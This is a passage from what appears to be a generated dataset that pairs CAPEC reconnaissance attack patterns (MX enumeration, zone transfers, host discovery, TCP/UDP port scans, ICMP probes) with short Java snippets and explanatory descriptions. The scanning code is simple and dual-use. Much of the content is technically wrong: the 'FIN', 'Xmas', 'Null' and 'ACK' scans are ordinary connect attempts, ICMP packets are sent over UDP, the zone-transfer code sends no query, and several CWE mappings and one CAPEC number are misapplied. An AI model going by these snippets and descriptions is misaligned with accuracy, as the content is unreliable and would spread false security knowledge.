        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.Attributes;\nimport java.util.Hashtable;\n\npublic class MXRecordEnumeration {\n    public static void main(String[] args) {\n        String domain = \"example.com\";\n        try {\n            // Set up the environment for creating the initial context\n            Hashtable<String, String> env = new Hashtable<String, String>();\n            env.put(\"java.naming.factory.initial\", \"com.sun.jndi.dns.DnsContextFactory\");\n            DirContext ictx = new InitialDirContext(env);\n            Attributes attrs = ictx.getAttributes(domain, new String[] {\"MX\"});\n            System.out.println(\"MX Records for domain: \" + domain);\n            attrs.get(\"MX\").getAll().asIterator().forEachRemaining(System.out::println);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using DNS queries. The code sets up a JNDI (Java Naming and Directory Interface) context to query DNS records and retrieves the MX records for the specified domain. This process can reveal sensitive information about the mail servers and potentially expose internal network details, such as the IP address of the firewall or other internal systems. The code embodies the main idea of CAPEC-Enumerate Mail Exchange (MX) Records and highlights related CWEs, such as the exposure of sensitive information (CWE-200) and the omission of security-relevant information (CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class DNSZoneTransfer {\n    public static void main(String[] args) {\n        String dnsServer = \"example.com\";\n        int port = 53;\n        try {\n            InetAddress inetAddress = InetAddress.getByName(dnsServer);\n            Socket socket = new Socket(inetAddress, port);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + dnsServer);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic attempt to perform a DNS Zone Transfer from a specified DNS server. The code connects to the DNS server on port 53 and reads the response, printing each line to the console. This represents the CAPEC idea of exploiting a DNS misconfiguration that permits a Zone Transfer, potentially exposing sensitive information about the network topology. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details, and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by using DNS information without proper validation."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class HostDiscovery {\n    public static void main(String[] args) {\n        String[] ipAddresses = {\"192.168.1.1\", \"192.168.1.2\", \"192.168.1.3\"};\n        for (String ip : ipAddresses) {\n            try {\n                InetAddress inet = InetAddress.getByName(ip);\n                if (inet.isReachable(1000)) {\n                    System.out.println(\"Host \" + ip + \" is reachable.\");\n                } else {\n                    System.out.println(\"Host \" + ip + \" is not reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + ip);\n            } catch (IOException e) {\n                System.out.println(\"Error checking host: \" + ip);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet performs a basic host discovery operation by attempting to 'ping' a range of IP addresses to determine if they are reachable. The code iterates over a list of IP addresses, uses the `InetAddress` class to check if each IP address is reachable within a timeout of 1000 milliseconds, and prints the result. This embodies the main idea of the CAPEC 'Host Discovery' by demonstrating how an adversary might probe a range of IP addresses to identify active hosts. The code also touches on related CWEs: it could expose sensitive information (CWE-200) by revealing which hosts are active, and it uses cleartext transmission (CWE-319) since the reachability check does not involve any encryption. Additionally, it does not involve any authentication (CWE-291) or DNS resolution (CWE-350), but these could be relevant in a more complex implementation."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class Traceroute {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java Traceroute <hostname>\");\n            return;\n        }\n\n        String target = args[0];\n        int maxHops = 30;\n        int timeout = 3000; // 3 seconds\n\n        for (int ttl = 1; ttl <= maxHops; ttl++) {\n            try {\n                Process trace = Runtime.getRuntime().exec(\"ping -c 1 -t \" + ttl + \" \" + target);\n                trace.waitFor();\n                InetAddress address = InetAddress.getByName(target);\n                if (trace.exitValue() == 0) {\n                    System.out.println(\"Reached target: \" + address.getHostAddress());\n                    break;\n                } else {\n                    System.out.println(\"Hop \" + ttl + \": \" + address.getHostAddress());\n                }\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + target);\n                break;\n            } catch (InterruptedException e) {\n                System.out.println(\"Traceroute interrupted\");\n                break;\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple traceroute utility that attempts to map out the route data takes to reach a target destination. The code uses the 'ping' command with increasing TTL (Time-to-Live) values to identify each hop along the route. This process can expose sensitive information about the network topology, which aligns with the CAPEC description of 'Traceroute Route Enumeration'. The code also touches on several related CWEs: it could expose sensitive system information (CWE-497), transmit data in cleartext (CWE-319), and potentially send data to an incorrect destination (CWE-941). The code is a basic example and lacks proper security measures, making it vulnerable to misuse."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPAddressMaskRequest {\n    public static void main(String[] args) {\n        try {\n            InetAddress target = InetAddress.getByName(\"192.168.1.1\");\n            byte[] icmpRequest = new byte[8];\n            icmpRequest[0] = 17; // ICMP Type 17 (Address Mask Request)\n            icmpRequest[1] = 0;  // Code\n            // Checksum, Identifier, Sequence Number are set to 0 for simplicity\n\n            DatagramSocket socket = new DatagramSocket();\n            DatagramPacket packet = new DatagramPacket(icmpRequest, icmpRequest.length, target, 0);\n            socket.send(packet);\n\n            byte[] buffer = new byte[1024];\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n\n            System.out.println(\"Received ICMP Address Mask Reply from: \" + response.getAddress().getHostAddress());\n            // Process the response to extract sensitive information\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Type 17 Address Mask Request to a target IP address (192.168.1.1) to gather sensitive networking information. The code constructs an ICMP request packet, sends it to the target, and waits for an ICMP Type 18 Address Mask Reply. This reply can contain sensitive information such as subnet masks, default gateways, and broadcast addresses. The code highlights vulnerabilities related to the exposure of sensitive information (CWE-200), reliance on IP address for authentication (CWE-291), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/timestamp\")\npublic class TimestampServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        if (sensitiveData != null) {\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            response.getWriter().println(\"Sensitive Data: \" + sensitiveData);\n        }\n        // Return the current timestamp\n        String timestamp = new SimpleDateFormat(\"yyyy.MM.dd.HH.mm.ss\").format(new Date());\n        response.setContentType(\"text/plain\");\n        PrintWriter out = response.getWriter();\n        out.println(\"Current Timestamp: \" + timestamp);\n    }\n}",
        "description": "This Java servlet code demonstrates a potential vulnerability related to the 'Timestamp Request' attack pattern. The servlet handles HTTP GET requests and returns the current timestamp. It also processes a sensitive query string parameter, exposing it in the response. This can be exploited by an attacker to gather timing information and sensitive data. The code highlights CWE-598 by using the GET method to handle sensitive data, and CWE-200 by exposing this data to unauthorized actors. The timestamp can be used to attack time-based security mechanisms, aligning with the CAPEC description."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPInfoRequest {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\");\n            byte[] buffer = new byte[8];\n            buffer[0] = 0x0F; // Type: ICMP Information Request (deprecated)\n            buffer[1] = 0x00; // Code\n            buffer[2] = 0x00; // Checksum (not calculated for simplicity)\n            buffer[3] = 0x00;\n            buffer[4] = 0x00; // Identifier\n            buffer[5] = 0x00;\n            buffer[6] = 0x00; // Sequence Number\n            buffer[7] = 0x00;\n\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 0);\n            DatagramSocket socket = new DatagramSocket();\n            socket.send(packet);\n\n            // Receive response\n            socket.receive(packet);\n            System.out.println(\"Received response from: \" + packet.getAddress());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might send an ICMP Information Request to a host to determine if it responds to this deprecated mechanism. The code constructs an ICMP Information Request packet and sends it to a specified IP address. If the host responds, it indicates that the host is using a deprecated and potentially insecure protocol. This can expose sensitive system information (CWE-497) and transmit data in cleartext (CWE-319), making it vulnerable to unauthorized actors. The code also lacks proper identifiers (CWE-1192, CWE-1302), which can further compromise security."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckPing {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TCPAckPing <host>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = 80; // Common HTTP port\n\n        try {\n            InetAddress inetAddress = InetAddress.getByName(host);\n            Socket socket = new Socket(inetAddress, port);\n            socket.setSoLinger(true, 0); // Forces a RST packet on close\n            socket.close();\n            System.out.println(\"Host is alive: \" + host);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + host);\n        } catch (IOException e) {\n            System.out.println(\"Host is not responding: \" + host);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP ACK Ping to check if a host is alive. The program attempts to create a socket connection to the specified host on port 80. If the connection is successful, it sets the socket to linger with a timeout of 0, which forces a TCP RST packet when the socket is closed. This behavior can be used to determine if the host is alive based on the RST response. The code also handles exceptions for unknown hosts and IO errors, indicating whether the host is not responding. This snippet embodies the main idea of the CAPEC by using TCP ACK to check host availability and relates to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the host's status. Additionally, it touches on CWE-319 (Cleartext Transmission of Sensitive Information) since the communication is not encrypted, potentially exposing sensitive information."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPPing {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 65535); // High port number\n            socket.send(packet);\n            socket.receive(packet); // Vulnerable to CWE-200, CWE-319\n            System.out.println(\"Received response from: \" + packet.getAddress());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a UDP ping to a high port (65535) on a target IP address (192.168.1.1). The code sends a UDP datagram and waits for a response, which could be an 'ICMP port unreachable' message indicating the host is alive. This embodies the main idea of the CAPEC 'UDP Ping'. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information) because it does not secure the communication channel, potentially exposing sensitive information. Additionally, the code does not handle the destination correctly, which could lead to CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynPing {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress inet = InetAddress.getByName(target);\n            Socket socket = new Socket(inet, port);\n            System.out.println(\"Host is alive\");\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"Host is not responding\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP SYN ping to check if a host is alive by attempting to establish a connection to a specified port. The code tries to create a socket connection to the target IP address on port 80. If the connection is successful, it prints 'Host is alive', otherwise, it catches exceptions and prints 'Host is not responding'. This embodies the main idea of the CAPEC 'TCP SYN Ping' by using TCP SYN packets to discover if a host is active. The code also indirectly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it could expose the host's status to unauthorized actors. Additionally, it hints at CWE-605 (Multiple Binds to the Same Port) by attempting to bind to a common port (80), which could lead to service disruption if multiple binds were allowed."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try (InputStream input = clientSocket.getInputStream();\n             OutputStream output = clientSocket.getOutputStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            String request = new String(buffer, 0, bytesRead);\n            if (request.contains(\"GET /debug\")) {\n                output.write(\"Debug mode activated\".getBytes());\n            } else {\n                output.write(\"Hello, World!\".getBytes());\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens on port 8080 and handles incoming client connections. The server reads the client's request and checks if it contains the string 'GET /debug'. If it does, the server responds with 'Debug mode activated'. This embodies the main idea of CAPEC-300 (Port Scanning) by exposing a service on a specific port that can be discovered and exploited by an adversary. The code also demonstrates CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime) by allowing a debug mode to be activated via a network request. Additionally, the server transmits responses in cleartext, which relates to CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPConnectScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            Socket socket = new Socket(target, port);\n            System.out.println(\"Port \" + port + \" is open on \" + target);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connect scan, which attempts to establish a full TCP connection to a specified port on a target system. The code tries to create a socket connection to the target IP address on the specified port. If the connection is successful, it prints that the port is open; otherwise, it prints that the port is closed. This embodies the main idea of the CAPEC 'TCP Connect Scan'. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) by revealing open ports, and it relies on IP addresses (CWE-291) for identifying the target."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPFinScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.close();\n            System.out.println(\"Port \" + port + \" is open.\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connection attempt to a specified target IP address and port. The main idea is to check if a port is open or closed by attempting to establish a connection. If the connection is successful, the port is considered open; otherwise, it is considered closed. This embodies the concept of a TCP FIN scan, where an adversary sends packets to determine the state of ports. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and not verifying the integrity of the data (CWE-353)."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class XmasScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            // Set all TCP flags (XMAS scan)\n            buffer.put((byte) 0xFF);\n            buffer.flip();\n\n            socketChannel.write(buffer);\n            buffer.clear();\n\n            int bytesRead = socketChannel.read(buffer);\n            if (bytesRead > 0) {\n                System.out.println(\"Received response from target\");\n            } else {\n                System.out.println(\"No response from target\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP Xmas scan. The code attempts to connect to a specified target IP address and port, then sends a TCP packet with all flags set (XMAS scan). The response is read to determine if the port is closed (indicated by a RST packet). This scan type exploits the behavior described in RFC 793, where closed ports respond with a RST packet to out-of-state TCP segments. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353, CWE-924), and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPNullScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.setTcpNoDelay(true);\n            socket.getOutputStream().write(new byte[0]); // Sending TCP segment with no flags\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP NULL scan, which is used to determine if a port is closed on a target machine. The code attempts to create a socket connection to a specified target and port, then sends an empty byte array to simulate a TCP segment with no flags. If the port is closed, an IOException is caught, indicating that the port is closed. This behavior aligns with the CAPEC description of using TCP NULL scans to identify closed ports. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and not verifying the integrity of the data (CWE-353)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.setSoLinger(true, 0); // CWE-605: Multiple Binds to the Same Port\n            socket.getOutputStream().write(\"GET / HTTP/1.1\\r\\nHost: \".getBytes()); // CWE-319: Cleartext Transmission\n            socket.getOutputStream().flush();\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP ACK scan to gather information about firewall or ACL configurations. The code attempts to connect to a specified target and port, sending a simple HTTP GET request in cleartext (CWE-319). The use of `setSoLinger` with a zero timeout can lead to issues with multiple binds to the same port (CWE-605). This code represents the main idea of the CAPEC by showing how an adversary might use TCP connections to probe and gather information about network configurations, potentially exposing sensitive information (CWE-200) and access control weaknesses (CWE-1280, CWE-529)."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPWindowScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            int windowSize = socket.getReceiveBufferSize();\n            System.out.println(\"TCP Window Size: \" + windowSize);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a basic TCP Window Scan. The code attempts to connect to a specified target IP address and port. If the connection is successful, it retrieves and prints the TCP window size of the socket. This information can be used to infer the status of the port and potentially the operating system type. The code embodies the main idea of CAPEC-303 (TCP Window Scan) by leveraging the TCP window size field to gather information. The related CWEs are represented as follows:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The code exposes the TCP window size, which can be sensitive information.\n- CWE-319 (Cleartext Transmission of Sensitive Information): The TCP window size is transmitted in cleartext.\n- CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere): The code does not prevent unauthorized access to the TCP window size.\n- CWE-353 (Missing Support for Integrity Check): The code does not verify the integrity of the data received.\n- CWE-385 (Covert Timing Channel): The timing of the response could be used to infer additional information."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableRPCServer {\n    private static final Logger logger = Logger.getLogger(VulnerableRPCServer.class.getName());\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(1111)) { // Port 1111 is commonly used for RPC\n            logger.info(\"RPC Server is listening on port 1111\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new Thread(new ClientHandler(socket)).start();\n            }\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Server exception: \", e);\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // Simulate handling RPC request without proper authentication\n            logger.info(\"Handling RPC request from \" + socket.getInetAddress());\n            // Potentially vulnerable code: no authentication, no integrity check\n            // Simulate exposure of sensitive information\n            socket.getOutputStream().write(\"Sensitive data\".getBytes());\n            socket.getOutputStream().flush();\n        } catch (IOException e) {\n            Logger.getLogger(ClientHandler.class.getName()).log(Level.SEVERE, \"Client handler exception: \", e);\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                Logger.getLogger(ClientHandler.class.getName()).log(Level.SEVERE, \"Could not close socket: \", e);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable RPC server that listens on port 1111, which is commonly used for RPC services. The server accepts incoming connections and spawns a new thread to handle each client. The ClientHandler class simulates handling an RPC request but does so without proper authentication or integrity checks, exposing sensitive information to unauthorized actors. This embodies the main idea of the CAPEC 'TCP RPC Scan' and demonstrates related CWEs such as CWE-200 (Exposure of Sensitive Information), CWE-294 (Authentication Bypass by Capture-replay), and CWE-494 (Download of Code Without Integrity Check). The code is vulnerable to attacks where an adversary can scan for RPC services and exploit these weaknesses."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketTimeoutException;\n\npublic class UDPScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 12345;\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(1000); // Set timeout for response\n            InetAddress address = InetAddress.getByName(target);\n            byte[] buf = new byte[256];\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, port);\n            socket.send(packet);\n            try {\n                socket.receive(packet); // Attempt to receive a response\n                System.out.println(\"Port \" + port + \" is open.\");\n            } catch (SocketTimeoutException e) {\n                System.out.println(\"Port \" + port + \" is closed or filtered.\");\n            }\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP scan to determine the status of a specific UDP port on a target system. The code sends a UDP datagram to the target port and waits for a response. If a response is received, it indicates that the port is open. If no response is received within the specified timeout, it is assumed that the port is closed or filtered. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the UDP port status. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information) is implied as the scan could reveal sensitive information about open ports; CWE-605 (Multiple Binds to the Same Port) is not directly represented but could be a concern in a more complex implementation; CWE-319 (Cleartext Transmission) is represented as the UDP datagram is sent in cleartext; CWE-353 (Missing Support for Integrity Check) is represented as UDP does not inherently verify data integrity; CWE-385 (Covert Timing Channel) is indirectly represented as the timing of responses (or lack thereof) is used to infer port status."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class NetworkScanner {\n    public static void main(String[] args) {\n        String subnet = \"192.168.1.\";\n        for (int i = 1; i < 255; i++) {\n            String host = subnet + i;\n            try {\n                InetAddress inetAddress = InetAddress.getByName(host);\n                if (inetAddress.isReachable(1000)) {\n                    System.out.println(\"Host: \" + host + \" is reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + host);\n            } catch (IOException e) {\n                System.err.println(\"Error reaching host: \" + host);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple network scanner that attempts to map network nodes by checking the reachability of IP addresses within a given subnet. The code iterates through a range of IP addresses (192.168.1.1 to 192.168.1.254) and uses the `InetAddress` class to determine if each address is reachable. If an address is reachable, it prints out the host information. This embodies the main idea of CAPEC-309 (Network Topology Mapping) by performing network reconnaissance to identify active hosts. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and having an excessive attack surface (CWE-1125) due to the broad scanning range."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableSoftwareScanner {\n    private static final int[] COMMON_PORTS = {21, 23, 25, 161}; // FTP, Telnet, SMTP, SNMP\n\n    public static void main(String[] args) throws IOException {\n        String targetIp = \"192.168.1.1\"; // Example target IP\n        List<Integer> openPorts = new ArrayList<>();\n\n        for (int port : COMMON_PORTS) {\n            if (isPortOpen(targetIp, port)) {\n                openPorts.add(port);\n                System.out.println(\"Port \" + port + \" is open on \" + targetIp);\n            }\n        }\n\n        if (!openPorts.isEmpty()) {\n            System.out.println(\"Scanning for vulnerable software...\");\n            // Simulate scanning for vulnerable software versions\n            for (int port : openPorts) {\n                System.out.println(\"Found vulnerable software on port \" + port);\n            }\n        }\n    }\n\n    private static boolean isPortOpen(String ip, int port) {\n        try (Socket socket = new Socket(ip, port)) {\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple scanner that checks for open ports commonly associated with vulnerable services (FTP, Telnet, SMTP, SNMP) on a target IP address. The code iterates through a list of common ports and attempts to establish a socket connection to each port. If a connection is successful, it indicates that the port is open. The code then simulates scanning for vulnerable software on the identified open ports. This embodies the main idea of the CAPEC 'Scanning for Vulnerable Software' by demonstrating how an attacker might identify open ports and subsequently look for vulnerable software versions running on those ports. The code also touches on related CWEs, such as the exposure of sensitive information (open ports) and the potential for excessive attack surface due to open and potentially vulnerable services."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        int[] ports = {80, 443, 22};\n\n        for (int port : ports) {\n            try (Socket socket = new Socket(targetIP, port)) {\n                System.out.println(\"Port \" + port + \" is open on \" + targetIP);\n            } catch (IOException e) {\n                System.out.println(\"Port \" + port + \" is closed on \" + targetIP);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a basic form of active OS fingerprinting by attempting to connect to a set of common ports (80, 443, 22) on a target IP address (192.168.1.1). The code iterates over the specified ports and tries to establish a socket connection to each port. If the connection is successful, it prints that the port is open; otherwise, it prints that the port is closed. This technique can be used to infer the operating system of the target based on the behavior of the open and closed ports. The code also indirectly touches on CWE-589 (Call to Non-ubiquitous API) as it assumes the availability of certain network functions that may not be present on all platforms, potentially leading to inconsistencies or denial of service."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
